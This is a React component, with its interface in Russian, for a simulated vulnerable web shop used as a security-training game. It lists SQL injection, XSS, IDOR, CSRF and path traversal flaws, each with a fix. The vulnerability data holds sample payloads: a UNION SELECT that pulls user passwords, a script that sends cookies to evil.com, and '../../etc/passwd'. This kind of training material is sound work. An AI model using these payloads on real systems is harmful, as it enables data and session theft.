'use client';

import { useState, useMemo } from 'react';
import { Card, CardContent, CardHeader, CardTitle, CardDescription, CardFooter } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { Progress } from '@/components/ui/progress';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import {
  ShoppingCart,
  User,
  Settings,
  Code,
  Eye,
  EyeOff,
  Flag,
  Terminal,
  BarChart3,
  Network,
  Globe,
  Package,
  Server,
  Trash2,
  Zap,
} from 'lucide-react';

interface Vulnerability {
  id: string;
  name: string;
  description: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  location: string;
  exploitation: string;
  fix: string;
  discovered: boolean;
  exploited: boolean;
}

interface AppModule {
  id: string;
  name: string;
  description: string;
  icon: React.ReactNode;
  vulnerabilities: Vulnerability[];
}

export default function RealAppSimulation() {
  const [activeModule, setActiveModule] = useState<string>('shop');
  const [userInput, setUserInput] = useState<string>('');
  const [attackLog, setAttackLog] = useState<string[]>([]);
  const [discoveredVulns, setDiscoveredVulns] = useState<string[]>([]);
  const [exploitedVulns, setExploitedVulns] = useState<string[]>([]);
  const [userSession, setUserSession] = useState({
    id: 'user-123',
    name: 'Алексей Петров',
    email: 'alexey@example.com',
    role: 'customer',
    balance: 5000,
    cart: [] as string[],
  });
  const adminSession = {
    id: 'admin-001',
    name: 'Администратор',
    email: 'admin@store.com',
    role: 'admin' as const,
    permissions: ['users', 'products', 'orders', 'settings'],
  };

  const modules: AppModule[] = [
    {
      id: 'shop',
      name: 'Интернет-магазин',
      description: 'Каталог товаров, корзина, оформление заказа',
      icon: <ShoppingCart className="h-5 w-5" />,
      vulnerabilities: [
        {
          id: 'vuln-1',
          name: 'SQL инъекция в поиске',
          description: 'Параметр поиска товаров не экранируется',
          severity: 'high',
          location: '/api/products/search?q=',
          exploitation: "' UNION SELECT username, password FROM users--",
          fix: 'Использовать параметризованные запросы',
          discovered: false,
          exploited: false,
        },
        {
          id: 'vuln-2',
          name: 'XSS в отзывах',
          description: 'Поле отзыва не санитизируется',
          severity: 'medium',
          location: '/api/reviews',
          exploitation: "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
          fix: 'Использовать textContent вместо innerHTML',
          discovered: false,
          exploited: false,
        },
      ],
    },
    {
      id: 'user-profile',
      name: 'Профиль пользователя',
      description: 'Личный кабинет, настройки, история заказов',
      icon: <User className="h-5 w-5" />,
      vulnerabilities: [
        {
          id: 'vuln-3',
          name: 'IDOR (Insecure Direct Object Reference)',
          description: 'Можно получить доступ к чужим заказам',
          severity: 'high',
          location: '/api/orders/{id}',
          exploitation: 'Изменить ID заказа в URL',
          fix: 'Проверять принадлежность заказа текущему пользователю',
          discovered: false,
          exploited: false,
        },
        {
          id: 'vuln-4',
          name: 'CSRF в смене email',
          description: 'Отсутствует CSRF токен',
          severity: 'medium',
          location: '/api/profile/email',
          exploitation: 'Создать форму с автоотправкой',
          fix: 'Добавить CSRF токены',
          discovered: false,
          exploited: false,
        },
      ],
    },
    {
      id: 'admin-panel',
      name: 'Админ-панель',
      description: 'Управление пользователями, товарами, заказами',
      icon: <Settings className="h-5 w-5" />,
      vulnerabilities: [
        {
          id: 'vuln-5',
          name: 'Недостаточная авторизация',
          description: 'Доступ к админке без проверки роли',
          severity: 'critical',
          location: '/admin/dashboard',
          exploitation: 'Прямой переход по URL',
          fix: 'Проверять роль пользователя',
          discovered: false,
          exploited: false,
        },
        {
          id: 'vuln-6',
          name: 'Путь к файлам (Path Traversal)',
          description: 'Загрузка файлов без проверки',
          severity: 'high',
          location: '/api/admin/upload',
          exploitation: '../../etc/passwd',
          fix: 'Валидировать имена файлов',
          discovered: false,
          exploited: false,
        },
      ],
    },
    {
      id: 'api',
      name: 'API endpoints',
      description: 'REST API для мобильных приложений',
      icon: <Server className="h-5 w-5" />,
      vulnerabilities: [
        {
          id: 'vuln-7',
          name: 'Отсутствие rate limiting',
          description: 'Неограниченное количество запросов',
          severity: 'medium',
          location: '/api/auth/login',
          exploitation: 'Брутфорс паролей',
          fix: 'Добавить ограничение запросов',
          discovered: false,
          exploited: false,
        },
        {
          id: 'vuln-8',
          name: 'Информация об ошибках',
          description: 'Детальные ошибки в продакшене',
          severity: 'low',
          location: 'Все эндпоинты',
          exploitation: 'Анализ stack trace',
          fix: 'Скрывать детали ошибок',
          discovered: false,
          exploited: false,
        },
      ],
    },
  ];

  const currentModule = modules.find(m => m.id === activeModule) || modules[0];
  // eslint-disable-next-line react-hooks/exhaustive-deps
  const allVulnerabilities = useMemo(() => modules.flatMap(m => m.vulnerabilities), []);

  const addToLog = (message: string) => {
    const timestamp = new Date().toLocaleTimeString();
    setAttackLog(prev => [`[${timestamp}] ${message}`, ...prev.slice(0, 10)]);
  };

  const discoverVulnerability = (vulnId: string) => {
    if (!discoveredVulns.includes(vulnId)) {
      setDiscoveredVulns(prev => [...prev, vulnId]);
      const vuln = allVulnerabilities.find(v => v.id === vulnId);
      if (vuln) {
        addToLog(`🔍 Обнаружена уязвимость: ${vuln.name}`);
      }
    }
  };

  const exploitVulnerability = (vulnId: string) => {
    if (!exploitedVulns.includes(vulnId)) {
      setExploitedVulns(prev => [...prev, vulnId]);
      const vuln = allVulnerabilities.find(v => v.id === vulnId);
      if (vuln) {
        addToLog(`⚡ Эксплуатирована уязвимость: ${vuln.name}`);
        
        // Эффекты от эксплуатации
        switch (vulnId) {
          case 'vuln-1':
            addToLog('📊 Извлечены данные пользователей из БД');
            break;
          case 'vuln-3':
            addToLog('🔓 Получен доступ к чужим заказам');
            break;
          case 'vuln-5':
            addToLog('👑 Получен доступ к админ-панели');
            setUserSession(prev => ({ ...prev, role: 'admin' }));
            break;
        }
      }
    }
  };

  const testExploit = () => {
    if (!userInput.trim()) return;

    addToLog(`🧪 Тестирование: ${userInput.substring(0, 50)}...`);

    // Простая проверка для демонстрации
    const input = userInput.toLowerCase();
    
    // Проверка SQL инъекции
    if (input.includes('union') && input.includes('select') && input.includes('users')) {
      discoverVulnerability('vuln-1');
      if (input.includes('password')) {
        exploitVulnerability('vuln-1');
        addToLog('✅ Успешная SQL инъекция! Данные извлечены.');
      }
    }
    
    // Проверка XSS
    else if (input.includes('<script>') || input.includes('javascript:')) {
      discoverVulnerability('vuln-2');
      if (input.includes('cookie') || input.includes('document.cookie')) {
        exploitVulnerability('vuln-2');
        addToLog('✅ XSS payload выполнен!');
      }
    }
    
    // Проверка IDOR
    else if (input.includes('order') && /[0-9]+/.test(input)) {
      discoverVulnerability('vuln-3');
      exploitVulnerability('vuln-3');
      addToLog('✅ IDOR обнаружен! Доступ к заказам получен.');
    }
    
    // Проверка CSRF
    else if (input.includes('<form') && input.includes('method="post"')) {
      discoverVulnerability('vuln-4');
      exploitVulnerability('vuln-4');
      addToLog('✅ CSRF форма создана!');
    }
    
    // Проверка доступа к админке
    else if (input.includes('admin') || input.includes('/admin')) {
      discoverVulnerability('vuln-5');
      exploitVulnerability('vuln-5');
      addToLog('✅ Доступ к админ-панели получен!');
    }
    
    else {
      addToLog('❌ Эксплойт не сработал. Попробуйте другой подход.');
    }

    setUserInput('');
  };

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'critical': return 'bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300';
      case 'high': return 'bg-orange-100 text-orange-800 dark:bg-orange-900 dark:text-orange-300';
      case 'medium': return 'bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-300';
      case 'low': return 'bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300';
      default: return 'bg-gray-100 text-gray-800 dark:bg-gray-900 dark:text-gray-300';
    }
  };

  const totalVulns = allVulnerabilities.length;
  const discoveredCount = discoveredVulns.length;
  const exploitedCount = exploitedVulns.length;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 dark:from-slate-950 dark:to-slate-900 p-4">
      <div className="max-w-7xl mx-auto">
        {/* Заголовок */}
        <div className="mb-8">
          <div className="flex items-center gap-3 mb-4">
            <Globe className="h-8 w-8 text-blue-600 dark:text-blue-500" />
            <h1 className="text-3xl font-bold text-slate-900 dark:text-white">
              Симуляция реального приложения
            </h1>
          </div>
          <p className="text-slate-600 dark:text-slate-400">
            Полноценная симуляция интернет-магазина с цепочкой уязвимостей. Найдите и эксплуатируйте все уязвимости!
          </p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Левая колонка: Модули и уязвимости */}
          <div className="lg:col-span-2 space-y-6">
            {/* Модули приложения */}
            <Card className="border-slate-200 dark:border-slate-800">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Package className="h-5 w-5" />
                  Модули приложения
                </CardTitle>
                <CardDescription>Выберите модуль для исследования</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
                  {modules.map(module => (
                    <Button
                      key={module.id}
                      variant={activeModule === module.id ? "default" : "outline"}
                      onClick={() => setActiveModule(module.id)}
                      className="flex flex-col h-auto py-4"
                    >
                      <div className="mb-2">{module.icon}</div>
                      <div className="font-medium">{module.name}</div>
                      <div className="text-xs text-slate-500 mt-1">
                        {module.vulnerabilities.length} уязвимостей
                      </div>
                    </Button>
                  ))}
                </div>

                {/* Уязвимости текущего модуля */}
                <div className="space-y-4">
                  <h3 className="font-semibold text-slate-900 dark:text-white">
                    Уязвимости в модуле "{currentModule.name}"
                  </h3>
                  {currentModule.vulnerabilities.map(vuln => (
                    <Card 
                      key={vuln.id}
                      className={`border-l-4 ${
                        vuln.severity === 'critical' ? 'border-l-red-500' :
                        vuln.severity === 'high' ? 'border-l-orange-500' :
                        vuln.severity === 'medium' ? 'border-l-yellow-500' :
                        'border-l-green-500'
                      }`}
                    >
                      <CardContent className="pt-6">
                        <div className="flex items-start justify-between mb-3">
                          <div>
                            <div className="flex items-center gap-2 mb-1">
                              <h4 className="font-semibold">{vuln.name}</h4>
                              <Badge className={getSeverityColor(vuln.severity)}>
                                {vuln.severity === 'critical' ? 'Критическая' :
                                 vuln.severity === 'high' ? 'Высокая' :
                                 vuln.severity === 'medium' ? 'Средняя' : 'Низкая'}
                              </Badge>
                            </div>
                            <p className="text-sm text-slate-600 dark:text-slate-400 mb-2">
                              {vuln.description}
                            </p>
                          </div>
                          <div className="flex items-center gap-2">
                            {discoveredVulns.includes(vuln.id) && (
                              <Eye className="h-4 w-4 text-blue-500" />
                            )}
                            {exploitedVulns.includes(vuln.id) && (
                              <Zap className="h-4 w-4 text-green-500" />
                            )}
                          </div>
                        </div>
                        
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
                          <div>
                            <div className="font-medium text-slate-700 dark:text-slate-300">Расположение:</div>
                            <code className="text-xs bg-slate-100 dark:bg-slate-800 p-1 rounded">
                              {vuln.location}
                            </code>
                          </div>
                          <div>
                            <div className="font-medium text-slate-700 dark:text-slate-300">Эксплуатация:</div>
                            <code className="text-xs bg-slate-100 dark:bg-slate-800 p-1 rounded">
                              {vuln.exploitation.substring(0, 40)}...
                            </code>
                          </div>
                        </div>

                        <div className="mt-4 flex gap-2">
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => discoverVulnerability(vuln.id)}
                            disabled={discoveredVulns.includes(vuln.id)}
                          >
                            <Eye className="h-3 w-3 mr-1" />
                            Обнаружить
                          </Button>
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => exploitVulnerability(vuln.id)}
                            disabled={!discoveredVulns.includes(vuln.id) || exploitedVulns.includes(vuln.id)}
                          >
                            <Zap className="h-3 w-3 mr-1" />
                            Эксплуатировать
                          </Button>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </CardContent>
            </Card>

            {/* Поле для тестирования */}
            <Card className="border-slate-200 dark:border-slate-800">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Code className="h-5 w-5" />
                  Тестирование эксплойтов
                </CardTitle>
                <CardDescription>Введите payload для тестирования уязвимостей</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <div className="flex items-center gap-2">
                    <Input
                      value={userInput}
                      onChange={(e) => setUserInput(e.target.value)}
                      placeholder="Введите SQL инъекцию, XSS payload, или другой эксплойт..."
                      className="font-mono text-sm"
                    />
                    <Button onClick={testExploit}>
                      <Zap className="h-4 w-4 mr-2" />
                      Тестировать
                    </Button>
                  </div>
                  <div className="text-xs text-slate-500">
                    Примеры: ' UNION SELECT ... --, &lt;script&gt;alert(1)&lt;/script&gt;, /admin/dashboard
                  </div>
                </div>

                {/* Примеры эксплойтов */}
                <div className="space-y-2">
                  <h4 className="font-medium text-slate-900 dark:text-white">Быстрые примеры:</h4>
                  <div className="flex flex-wrap gap-2">
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => setUserInput("' UNION SELECT username, password FROM users--")}
                      className="text-xs"
                    >
                      SQL инъекция
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => setUserInput("<script>alert('XSS')</script>")}
                      className="text-xs"
                    >
                      XSS
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => setUserInput("/api/orders/999")}
                      className="text-xs"
                    >
                      IDOR
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => setUserInput("/admin/dashboard")}
                      className="text-xs"
                    >
                      Админка
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Правая колонка: Статистика и логи */}
          <div className="space-y-6">
            {/* Статистика */}
            <Card className="border-slate-200 dark:border-slate-800">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <BarChart3 className="h-5 w-5" />
                  Статистика
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-2 gap-4">
                  <div className="text-center p-3 bg-slate-50 dark:bg-slate-900/50 rounded-lg">
                    <div className="text-2xl font-bold text-blue-600 dark:text-blue-500">
                      {discoveredCount}/{totalVulns}
                    </div>
                    <div className="text-sm text-slate-600 dark:text-slate-400">Обнаружено</div>
                  </div>
                  <div className="text-center p-3 bg-slate-50 dark:bg-slate-900/50 rounded-lg">
                    <div className="text-2xl font-bold text-green-600 dark:text-green-500">
                      {exploitedCount}/{totalVulns}
                    </div>
                    <div className="text-sm text-slate-600 dark:text-slate-400">Эксплуатировано</div>
                  </div>
                </div>

                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-slate-600 dark:text-slate-400">Прогресс обнаружения</span>
                    <span className="font-medium">
                      {Math.round((discoveredCount / totalVulns) * 100)}%
                    </span>
                  </div>
                  <Progress value={(discoveredCount / totalVulns) * 100} />
                </div>

                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-slate-600 dark:text-slate-400">Прогресс эксплуатации</span>
                    <span className="font-medium">
                      {Math.round((exploitedCount / totalVulns) * 100)}%
                    </span>
                  </div>
                  <Progress value={(exploitedCount / totalVulns) * 100} />
                </div>

                {/* Сессии пользователей */}
                <div className="space-y-3">
                  <h4 className="font-medium text-slate-900 dark:text-white">Текущие сессии:</h4>
                  <div className="space-y-2">
                    <div className="p-3 bg-blue-50 dark:bg-blue-900/20 rounded-lg">
                      <div className="flex items-center gap-2 mb-1">
                        <User className="h-4 w-4" />
                        <span className="font-medium">{userSession.name}</span>
                        <Badge variant={userSession.role === 'admin' ? "default" : "outline"}>
                          {userSession.role === 'admin' ? 'Администратор' : 'Пользователь'}
                        </Badge>
                      </div>
                      <div className="text-xs text-slate-600 dark:text-slate-400">
                        Баланс: {userSession.balance} руб.
                      </div>
                    </div>
                    <div className="p-3 bg-purple-50 dark:bg-purple-900/20 rounded-lg">
                      <div className="flex items-center gap-2 mb-1">
                        <Settings className="h-4 w-4" />
                        <span className="font-medium">{adminSession.name}</span>
                        <Badge variant="default">Администратор</Badge>
                      </div>
                      <div className="text-xs text-slate-600 dark:text-slate-400">
                        Права: {adminSession.permissions.join(', ')}
                      </div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Лог атак */}
            <Card className="border-slate-200 dark:border-slate-800">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Terminal className="h-5 w-5" />
                  Лог атак
                </CardTitle>
                <CardDescription>История ваших действий</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="bg-slate-900 rounded-lg p-3 h-64 overflow-y-auto font-mono text-sm">
                  {attackLog.length > 0 ? (
                    attackLog.map((log, idx) => (
                      <div key={idx} className="text-slate-300 py-1 border-b border-slate-800 last:border-b-0">
                        {log}
                      </div>
                    ))
                  ) : (
                    <div className="text-slate-500 italic">Лог пуст. Начните исследование...</div>
                  )}
                </div>
              </CardContent>
              <CardFooter>
                <Button
                  variant="outline"
                  size="sm"
                  className="w-full"
                  onClick={() => setAttackLog([])}
                >
                  <Trash2 className="h-3 w-3 mr-2" />
                  Очистить лог
                </Button>
              </CardFooter>
            </Card>

            {/* Цепочка атак */}
            <Card className="border-slate-200 dark:border-slate-800">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Network className="h-5 w-5" />
                  Цепочка атак
                </CardTitle>
                <CardDescription>Последовательность эксплуатации</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  <div className="flex items-center gap-2 text-sm">
                    <div className="w-6 h-6 rounded-full bg-blue-100 text-blue-800 flex items-center justify-center">
                      1
                    </div>
                    <span className={discoveredVulns.includes('vuln-1') ? 'text-blue-600' : 'text-slate-400'}>
                      SQL инъекция → данные пользователей
                    </span>
                  </div>
                  <div className="flex items-center gap-2 text-sm">
                    <div className="w-6 h-6 rounded-full bg-orange-100 text-orange-800 flex items-center justify-center">
                      2
                    </div>
                    <span className={exploitedVulns.includes('vuln-5') ? 'text-orange-600' : 'text-slate-400'}>
                      Доступ к админке → полный контроль
                    </span>
                  </div>
                  <div className="flex items-center gap-2 text-sm">
                    <div className="w-6 h-6 rounded-full bg-red-100 text-red-800 flex items-center justify-center">
                      3
                    </div>
                    <span className={exploitedVulns.length >= 6 ? 'text-red-600' : 'text-slate-400'}>
                      Полная компрометация системы
                    </span>
                  </div>
                </div>
                
                {exploitedVulns.length >= 6 && (
                  <Alert className="mt-4 bg-green-50 border-green-200">
                    <Flag className="h-4 w-4 text-green-600" />
                    <AlertTitle>Поздравляем!</AlertTitle>
                    <AlertDescription>
                      Вы успешно скомпрометировали всю систему! Все уязвимости найдены и эксплуатированы.
                    </AlertDescription>
                  </Alert>
                )}
              </CardContent>
            </Card>
          </div>
        </div>

        {/* Итоговая статистика */}
        <div className="mt-8">
          <Card className="border-slate-200 dark:border-slate-800">
            <CardHeader>
              <CardTitle>Итоговый отчёт</CardTitle>
              <CardDescription>Результаты тестирования безопасности</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                {allVulnerabilities.map(vuln => (
                  <div
                    key={vuln.id}
                    className={`p-3 rounded-lg border ${
                      exploitedVulns.includes(vuln.id)
                        ? 'bg-green-50 border-green-200 dark:bg-green-900/20 dark:border-green-800'
                        : discoveredVulns.includes(vuln.id)
                        ? 'bg-yellow-50 border-yellow-200 dark:bg-yellow-900/20 dark:border-yellow-800'
                        : 'bg-slate-50 border-slate-200 dark:bg-slate-900/20 dark:border-slate-800'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-2">
                      <div className="font-medium">{vuln.name}</div>
                      <div className="flex items-center gap-1">
                        {exploitedVulns.includes(vuln.id) ? (
                          <Zap className="h-4 w-4 text-green-600" />
                        ) : discoveredVulns.includes(vuln.id) ? (
                          <Eye className="h-4 w-4 text-yellow-600" />
                        ) : (
                          <EyeOff className="h-4 w-4 text-slate-400" />
                        )}
                      </div>
                    </div>
                    <div className="text-xs text-slate-600 dark:text-slate-400">
                      {vuln.severity === 'critical' ? '🟥 Критическая' :
                       vuln.severity === 'high' ? '🟧 Высокая' :
                       vuln.severity === 'medium' ? '🟨 Средняя' : '🟩 Низкая'}
                    </div>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}